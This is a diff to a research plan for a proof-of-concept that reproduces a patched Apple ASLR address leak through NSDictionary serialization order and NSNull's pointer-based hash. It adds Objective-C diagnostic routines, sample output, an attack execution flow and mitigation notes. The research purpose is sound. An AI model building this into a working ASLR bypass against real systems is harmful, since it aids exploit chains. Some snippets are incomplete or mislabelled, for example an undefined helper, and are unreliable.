@@ -25,12 +25,218 @@ Apple patched this in their March 31, 2025 security releases.
 ### Single Binary Design
 
 Build one Objective-C program (`leak-slide.m`) that:
-1. Constructs `NSDictionary` instances with calculated `NSNumber` keys
-2. Serializes the dictionaries containing `NSNull` singleton
-3. Observes `NSNull` position in serialized output
-4. Applies Chinese Remainder Theorem to extract the address
-5. Compares extracted address against actual `NSNull` location
-6. Calculates and displays the ASLR slide
+1. **Runs diagnostic tests** to characterize hash behavior
+2. Constructs `NSDictionary` instances with calculated `NSNumber` keys
+3. Serializes the dictionaries containing `NSNull` singleton
+4. Observes `NSNull` position in serialized output
+5. Applies Chinese Remainder Theorem to extract the address
+6. Compares extracted address against actual `NSNull` location
+7. Calculates and displays the ASLR slide
+
+### Phase 0: Hash Behavior Diagnostics
+
+Before attempting the full attack, run diagnostic tests to understand the current hash implementation and identify which mitigation (if any) Apple deployed.
+
+#### Test 1: NSNull Hash Stability
+
+```objective-c
+void testNSNullHashStability() {
+    NSNull *null1 = [NSNull null];
+    NSNull *null2 = [NSNull null];
+
+    uintptr_t addr = (uintptr_t)null1;
+    NSUInteger hash = [null1 hash];
+
+    printf("[Diagnostic] NSNull singleton address: 0x%lx\n", addr);
+    printf("[Diagnostic] NSNull hash value:         0x%lx\n", hash);
+    printf("[Diagnostic] Hash == Address:           %s\n",
+           (hash == addr) ? "YES (vulnerable)" : "NO (possibly patched)");
+    printf("[Diagnostic] Singleton identity:        %s\n",
+           (null1 == null2) ? "YES" : "NO");
+}
+```
+
+**What this reveals:**
+- If `hash == address`: Pointer-based hashing is still used (unpatched or insufficient mitigation)
+- If `hash != address`: Apple changed the hash function (keyed hash or object ID approach)
+
+#### Test 2: Hash Determinism Across Runs
+
+```objective-c
+void testHashDeterminism() {
+    NSNull *null = [NSNull null];
+    NSUInteger hash1 = [null hash];
+
+    // Force re-computation if possible
+    sleep(1);
+    NSUInteger hash2 = [null hash];
+
+    printf("[Diagnostic] First hash:  0x%lx\n", hash1);
+    printf("[Diagnostic] Second hash: 0x%lx\n", hash2);
+    printf("[Diagnostic] Deterministic: %s\n",
+           (hash1 == hash2) ? "YES" : "NO (randomized per-run)");
+}
+```
+
+**What this reveals:**
+- If hash changes between runs: Keyed hash with per-process or per-boot randomization
+- If hash is stable: Either unpatched or deterministic object ID approach
+
+#### Test 3: Dictionary Serialization Order
+
+```objective-c
+void testSerializationOrder() {
+    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
+
+    // Insert in controlled order
+    dict[@1] = @"first";
+    dict[@2] = @"second";
+    dict[[NSNull null]] = @"null";
+    dict[@3] = @"third";
+
+    NSError *error = nil;
+    NSData *data = [NSKeyedArchiver archivedDataWithRootObject:dict
+                                         requiringSecureCoding:NO
+                                                         error:&error];
+
+    NSDictionary *decoded = [NSKeyedUnarchiver unarchivedObjectOfClass:[NSDictionary class]
+                                                               fromData:data
+                                                                  error:&error];
+
+    printf("[Diagnostic] Serialization test:\n");
+    NSUInteger idx = 0;
+    for (id key in decoded) {
+        const char *keyType = [key isKindOfClass:[NSNull class]] ? "NSNull" : "NSNumber";
+        printf("  Position %lu: %s\n", idx++, keyType);
+    }
+}
+```
+
+**What this reveals:**
+- If order is deterministic: Serialization order is based on hash values (leak possible)
+- If order is randomized: Apple added serialization randomization
+
+#### Test 4: NSNumber Hash Behavior
+
+```objective-c
+void testNSNumberHashBehavior() {
+    printf("[Diagnostic] NSNumber hash tests:\n");
+
+    for (int i = 0; i < 10; i++) {
+        NSNumber *num = @(i);
+        NSUInteger hash = [num hash];
+        uint64_t expected = (uint64_t)i * 0x9e3779b9;
+
+        printf("  @%d: hash=0x%lx, expected=0x%llx, %s\n",
+               i, hash, expected,
+               (hash == expected) ? "MATCH" : "DIFFERENT");
+    }
+}
+```
+
+**What this reveals:**
+- If hashes match `value * 0x9e3779b9`: NSNumber behavior unchanged
+- If hashes differ: Apple also changed NSNumber hashing (unlikely but possible)
+
+#### Test 5: Bucket Position Prediction
+
+```objective-c
+void testBucketPrediction() {
+    // Create a small dictionary and verify we can predict positions
+    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
+
+    uint64_t prime = 23;
+    // Calculate keys that should occupy even buckets
+    for (uint64_t bucket = 0; bucket < prime; bucket += 2) {
+        uint64_t key = findKeyForBucket(bucket, prime);
+        dict[@(key)] = @(bucket);
+    }
+
+    dict[[NSNull null]] = @"marker";
+
+    NSError *error = nil;
+    NSData *data = [NSKeyedArchiver archivedDataWithRootObject:dict
+                                         requiringSecureCoding:NO
+                                                         error:&error];
+
+    NSDictionary *decoded = [NSKeyedUnarchiver unarchivedObjectOfClass:[NSDictionary class]
+                                                               fromData:data
+                                                                  error:&error];
+
+    printf("[Diagnostic] Bucket prediction test (table size %llu):\n", prime);
+    NSUInteger position = 0;
+    for (id key in decoded) {
+        if ([key isKindOfClass:[NSNull class]]) {
+            printf("  NSNull found at position %lu\n", position);
+
+            // Try to deduce hash mod 23
+            // This should give us NSNull_hash % 23
+            printf("  This suggests NSNull hash %% 23 is in range [...]\n");
+            break;
+        }
+        position++;
+    }
+}
+```
+
+**What this reveals:**
+- If NSNull position matches prediction: Attack vector still viable
+- If position is unpredictable: Mitigation is effective
+
+### Diagnostic Output Format
+
+The PoC should start with:
+```
+========================================
+Hash Behavior Diagnostics
+========================================
+
+[Diagnostic] NSNull singleton address: 0x1eb91ab60
+[Diagnostic] NSNull hash value:         0x1eb91ab60
+[Diagnostic] Hash == Address:           YES (vulnerable)
+[Diagnostic] Singleton identity:        YES
+
+[Diagnostic] First hash:  0x1eb91ab60
+[Diagnostic] Second hash: 0x1eb91ab60
+[Diagnostic] Deterministic: YES
+
+[Diagnostic] Serialization test:
+  Position 0: NSNumber
+  Position 1: NSNull
+  Position 2: NSNumber
+  Position 3: NSNumber
+
+[Diagnostic] NSNumber hash tests:
+  @0: hash=0x0, expected=0x0, MATCH
+  @1: hash=0x9e3779b9, expected=0x9e3779b9, MATCH
+  ...
+
+[Diagnostic] Bucket prediction test (table size 23):
+  NSNull found at position 7
+  This suggests NSNull hash % 23 is in range [...]
+
+========================================
+Assessment: System appears VULNERABLE
+Proceeding with full attack...
+========================================
+```
+
+Or on a patched system:
+```
+========================================
+Hash Behavior Diagnostics
+========================================
+
+[Diagnostic] NSNull singleton address: 0x1eb91ab60
+[Diagnostic] NSNull hash value:         0x7f3a9b2c1d8e
+[Diagnostic] Hash == Address:           NO (possibly patched)
+[Diagnostic] Hash appears randomized
+
+========================================
+Assessment: Mitigation detected
+Attack unlikely to succeed, but attempting anyway for research...
+========================================
+```
 
 ### Key Components
 
@@ -185,7 +391,8 @@ Port the same single-binary approach:
 
 ```
 src/
-  leak-slide.m          # Main PoC implementation
+  leak-slide.m          # Main PoC implementation with diagnostics
+  diagnostics.h/m       # Phase 0 hash behavior tests
   hash-utils.h/m        # Hash function and modular arithmetic
   dict-builder.h/m      # Dictionary construction logic
   crt-solver.h/m        # Chinese Remainder Theorem implementation
@@ -197,6 +404,32 @@ tests/
 
 Makefile                # Build for macOS and iOS
 README.md               # Build and run instructions
+```
+
+### Execution Flow
+
+```
+1. Run Phase 0 diagnostics
+   ├─ Test NSNull hash stability
+   ├─ Test hash determinism
+   ├─ Test serialization order
+   ├─ Test NSNumber hashing
+   └─ Test bucket prediction
+
+2. Analyze diagnostic results
+   └─ Determine if system is vulnerable/patched
+
+3. Proceed with full attack (if viable)
+   ├─ Generate keys for each prime
+   ├─ Build dictionaries with even/odd patterns
+   ├─ Serialize and extract positions
+   ├─ Apply Chinese Remainder Theorem
+   └─ Compare leaked vs actual address
+
+4. Report results
+   ├─ Display ASLR slide (if successful)
+   ├─ Document mitigation mechanism (if patched)
+   └─ Write findings to stdout
 ```
 
 ## Key Insights to Document
@@ -236,14 +469,18 @@ Multiple security outlets covered this disclosure:
 
 **Apple's Mitigation Approach:**
 
-From the Project Zero blog, the suggested robust mitigation is:
+From the Project Zero blog (Conclusion section), Jann Horn states:
 > "The most robust mitigation against this is to avoid using object addresses as lookup keys, or alternatively hash them with a keyed hash function (which should reduce the potential address leak to a pointer equality oracle)."
+
+Horn also notes the performance tradeoff:
+> "using an ID stored inside an object instead of the object's address could add a memory load to the critical path of lookups."
 
 It's unclear from public sources whether Apple implemented:
 1. **Keyed hash function** - Adding secret randomization to hash computation
-2. **Serialization randomization** - Randomizing output order during serialization
-3. **Alternative singleton handling** - Changing how NSNull singleton is hashed
-4. **Combination approach** - Multiple mitigations layered together
+2. **Object ID instead of address** - Storing identifiers inside objects for hashing
+3. **Serialization randomization** - Randomizing output order during serialization
+4. **Alternative singleton handling** - Changing how NSNull singleton is hashed
+5. **Combination approach** - Multiple mitigations layered together
 
 ### Gap in Public Knowledge
 
